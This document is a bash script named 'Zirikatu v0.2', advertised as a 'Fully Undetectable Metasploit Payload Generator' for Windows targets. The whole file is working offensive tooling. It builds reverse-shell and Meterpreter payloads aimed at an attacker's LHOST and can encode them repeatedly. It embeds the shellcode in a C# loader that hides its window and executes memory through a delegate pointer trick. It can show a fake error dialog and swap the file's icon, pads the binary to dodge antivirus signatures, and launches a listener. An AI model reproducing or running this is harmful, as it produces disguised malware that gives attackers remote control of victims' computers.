#!/bin/bash
cat << !
         _____ _        _  _            _           
	/ _  /(_) _ __ (_)| | __  __ _ | |_  _   _  
	\// / | || '__|| || |/ / / _' || __|| | | | 
	 / //\| || |   | ||   < | (_| || |_ | |_| | 
	/____/|_||_|   |_||_|\_\ \__,_| \__| \__,_| 
                                            
                         ___      ____              
	       /\   /\  / _ \    |___ \             
	       \ \ / / | | | |     __) |            
	        \ V /  | |_| | _  / __/             
	         \_/    \___/ (_)|_____| 

!

echo -e "/==========================########========================\\"
echo -e "|                             #                            |"
echo -e "|                   #Fully Undetectable#                   |"
echo -e "|              #Metasploit Payload Generator#              |"
echo -e "|          #Tested on Debian Jessie and Kali Linux#        |"
echo -e "|———————————#—————————————————#——————————————————#—————————|"
echo -e "|                                            PasahitZ 2017 |"
echo -e "\==========================================================/"
echo ""
sleep 2
# Check root
if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
echo -e '\e[0;31m【!!】 This script need root permission\e[0m' 1>&2
exit
fi
dir=`pwd`
rm $dir/rm -rf output
rm $dir/rm -rf \source
rm $dir/rm -rf handler
mkdir $dir/output
mkdir $dir/source
mkdir $dir/handler

bar ()
{
BAR='█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█'    
                         
for i in {1..35}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.03
done
}

# check msfconsole
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfconsole='1'
else
msfconsole='0' 
fi

# check msfvenom 
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfvenom='1'
else
msfvenom='0'
fi

# check mono 
which mono > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
mono='1'
else
mono='0'
fi

# check mcs 
which mcs > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
mcs='1'
else
mcs='0'
fi

# check postgresql
which /etc/init.d/postgresql > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
postgresql='1'
else
postgresql='0'
fi 

# check fallocate
which fallocate > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
fallocate='1'
else
fallocate='0'
fi 

echo -n Check script dependencies = =;


sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$mono" == "1" ] && [ "$mcs" == "1" ] && [ "$postgresql" == "1" ] && [ "$fallocate" == "1" ]; then
echo -en "\b【\e[1;33mPass\e[0m】" 
echo ""
echo ""
echo -e 'msfconsole    【\e[1;33mOk\e[0m】'
echo -e 'msfvenom      【\e[1;33mOk\e[0m】'
echo -e 'mono          【\e[1;33mOk\e[0m】'
echo -e 'mcs           【\e[1;33mOk\e[0m】'
echo -e 'postgresql    【\e[1;33mOk\e[0m】'
echo -e 'fallocate     【\e[1;33mOk\e[0m】'

echo ""
sleep 2
fi
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$mono" == "0" ] || [ "$mcs" == "0" ] || [ "$postgresql" == "0" ] || [ "$fallocate" == "0" ]; then 
fail='1'
echo -en "\b \e[0;31m【Fail】\e[0m"
echo ""
echo ""
fi
if [ "$msfconsole" == "0" ] ;then 
echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
fi
if [ "$msfvenom" == "0" ] ;then 
echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
fi
if [ "$mono" == "0" ] ;then
echo -e 'mono          \e[0;31m【!!】 Not Found, first must be installed mono \e[0m';
fi
if [ "$mcs" == "0" ] ;then
echo -e 'mcs           \e[0;31m【!!】 Not Found, first must be installed mono\e[0m';
fi
if [ "$postgresql" == "0" ] ;then
echo -e 'postgresql    \e[0;31m【!!】 Not Found, first must be installed postgresql\e[0m';
fi
if [ "$fallocate" == "0" ] ;then
echo -e 'fallocate     \e[0;31m【!!】 Not Found, first must be installed fallocate\e[0m';
fi
if [ "$fail" == "1" ]; then
echo ""
sleep 2
echo -e '\e[0;31mThis script require all dependencies to work, install not found programs\e[0m'
echo -e '\e[0;31mMore information:\e[0m'  
echo -e '\e[0;31mhttps://www.metasploit.com/\e[0m'
echo -e '\e[0;31mhttp://www.mono-project.com/\e[0m'
echo -e '\e[0;31mhttps://www.postgresql.org/\e[0m' 
sleep 2
echo ""
echo -e '\e[0;31mExiting....\e[0m'
exit
fi

echo "[1] Meterpreter_Reverse_tcp		[5] Shell_reverse_tcp"
echo "[2] Meterpreter_Reverse_http		[6] Powershell_reverse_tcp"
echo "[3] Meterpreter_Reverse_https		[7] Multi encode payload"
echo "[4] Meterpreter_Reverse_tcp_dns"
echo ""
echo -e "Select a payload number: \c"
read option

#Aukeratu 
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
echo -e "Enter the number of iterations: 1-500 : \c"
read int
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 7 \e[0m'
exit
;;
esac

#Encoder
case ${int#[+]} in
*[!0-9]* ) 
echo -e '\e[0;31m【!!】 Invalid option,write a number \e[0m'
exit
;;
* )
if [[ $int -gt 500 || $int = 0 ]]; then
echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-500 \e[0m';
exit
fi 
;;
esac

#Ip
if [ "$option" == "4" ]; then
echo -e "Set Your No-Ip Hostname: \c"
read host
fi

echo -e "Set LHOST: \c"
read ip
if [[ "$ip" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
sleep 0.1
else
echo -e '\e[0;31m【!!】 Invalid IP adress \e[0m';
exit
fi

#Port
echo -e "Set LPORT: \c"
read port
case ${port#[+]} in
*[!0-9]* ) 
echo -e '\e[0;31m【!!】 Invalid option,write a number \e[0m'
exit
;;
* )
if [[ $port -gt 65535 || $port = 0 ]]; then
echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-65535 \e[0m';
exit
fi 
;;
esac

#ikonoa
echo -e "Do you want to change the payload icon? y or n : \c"
read icon
if [[ $icon != "y" && $icon != "n" ]]; then 
echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
exit
fi

#Mezua
echo -e "Display an error message? y or n : \c"
read error
case $error in
y) 
echo -e "Write title error message : \c"
read izenburua  
echo -e "Write the error message : \c"
read textua
;;
n)
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
exit
;;
esac
echo -e "Enter the output file name: \c"
read izena
echo ""
echo "Please wait a few seconds.........."
bar
if [ "$option" == "7" ]; then
msfvenom -p $payload LHOST=$ip LPORT=$port --platform windows -a x86 -e generic/none 2>/dev/null | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -i $int -f raw 2>/dev/null | msfvenom --platform windows -a x86 -e x86/fnstenv_mov -i $int -f hex >> behinbehineko 2>/dev/null;
encoded='Y'
fi
if [ "$option" == "4" ]; then
msfvenom -p $payload LHOST=$host LPORT=$port -f hex --smallest >> behinbehineko 2>/dev/null;
int='N'
encoded='N'
else
msfvenom -p $payload LHOST=$ip LPORT=$port -f hex --smallest >> behinbehineko 2>/dev/null;
int='N'
encoded='N'
fi
echo ""
sed 's/^/string HexadezimalKatea ="/' behinbehineko > behinbehineko1
sed 's/$/";/' behinbehineko1 > behinbehineko2
mv behinbehineko2 $dir/source/behinbehineko2
rm -f behinbehineko*
cd $dir/source/
echo "using System;" >> Kodea
echo "using System.Reflection;" >> Kodea
echo "using System.Runtime.InteropServices;" >> Kodea
if [ "$error" == "y" ]; then
echo "using System.Windows.Forms;" >> Kodea;
fi
echo "namespace zirikatu" >> Kodea
echo "{ class Program" >> Kodea
echo "{ [DllImport(\"kernel32.dll\", SetLastError = true)]" >> Kodea
echo "static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);" >> Kodea
echo "public delegate uint Ret1ArgDelegate(uint address);" >> Kodea
echo "static uint PlaceHolder1(uint arg1) { return 0; }" >> Kodea
echo "[DllImport(\"kernel32.dll\")]" >> Kodea
echo "static extern IntPtr GetConsoleWindow();" >> Kodea
echo "[DllImport(\"user32.dll\")]" >> Kodea
echo "static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" >> Kodea
echo "const int SW_HIDE = 0;" >> Kodea
echo "unsafe static void Main(string[] args)" >> Kodea
if [ "$error" == "y" ]; then
echo "{ MessageBox.Show(\"$textua\", \"$izenburua\",MessageBoxButtons.OK,MessageBoxIcon.Error);" >> Kodea
echo "var handle = GetConsoleWindow();" >> Kodea;
else
echo "{ var handle = GetConsoleWindow();" >> Kodea;
fi
echo "ShowWindow(handle, SW_HIDE);" >> Kodea
cat behinbehineko2 >> Kodea
rm -f behinbehineko2
echo "byte[] shellKodeahex = HexStringToByteArray(HexadezimalKatea);" >> Kodea
echo "burutu(shellKodeahex); }" >> Kodea
echo "public static byte[] HexStringToByteArray(String hexString)" >> Kodea
echo "{ byte[] retval = new byte[hexString.Length / 2];" >> Kodea
echo "for (int i = 0; i < hexString.Length; i += 2)" >> Kodea
echo "retval [i / 2] = Convert.ToByte (hexString.Substring (i, 2), 16);" >> Kodea
echo "return retval; }" >> Kodea
echo "unsafe public static void burutu(byte[] asmBytes)" >> Kodea
echo "{ fixed (byte* startAddress = &asmBytes[0])" >> Kodea
echo "{ Type delType = typeof(Delegate);" >> Kodea
echo "FieldInfo _methodPtr = delType.GetField(\"_methodPtr\", BindingFlags.NonPublic | BindingFlags.Instance);" >> Kodea
echo "Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);" >> Kodea
echo "_methodPtr.SetValue(del, (IntPtr) startAddress);" >> Kodea
echo "uint outOldProtection;" >> Kodea
echo "VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);" >> Kodea
echo "uint n = (uint)0x00000001;" >> Kodea
echo "n = del(n);" >> Kodea
echo "Console.WriteLine(\"{0:x}\", n);" >> Kodea
echo "Console.ReadKey();" >> Kodea
echo "}}}}" >> Kodea

#kompilatu
if [ "$icon" == "y" ] && [ "$error" == "n" ]; then 
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -out:$dir/output/$izena.exe
elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/$izena.exe
elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
mcs -platform:x86 -unsafe Kodea -out:$dir/output/$izena.exe
elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
fi

#aldaketa
tamainua=`stat -c %s $dir/output/$izena.exe`
offset=`echo $((512 + $RANDOM%512))`
luzeera=`echo $(($tamainua + $RANDOM%2000))`
fallocate -o $offset -l $luzeera $dir/output/$izena.exe

sleep 1
echo ""
echo "Succesfully Payload generated !!"
echo ""
echo "Payload file= $dir/output/$izena.exe"
echo "Payload size= `stat -c %s $dir/output/$izena.exe` Bytes"
sleep 2
echo ""
echo "*****************************************************************************"	
echo " LHOST=$ip			       NUMBER OF ITERATIONS=$int "
echo " LPORT=$port			               CHANGE ICON=${icon^^}"         
echo " ENCODED PAYLOAD=$encoded                             ERROR MESSAGE=${error^^}" 
echo " PAYLOAD=${payload^^}"	       
echo "*****************************************************************************"
sleep 2
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> $dir/handler/handler.rc
echo "set PAYLOAD $payload" >> $dir/handler/handler.rc
echo "set LHOST $ip" >> $dir/handler/handler.rc
echo "set LPORT $port" >> $dir/handler/handler.rc
echo "set EXITONSESSION false" >> $dir/handler/handler.rc
echo "exploit -j" >> $dir/handler/handler.rc
/etc/init.d/postgresql start
msfconsole -r $dir/handler/handler.rc
sleep 2
else
echo -e '\e[0;31mExiting....\e[0m'
sleep 1
exit
fi
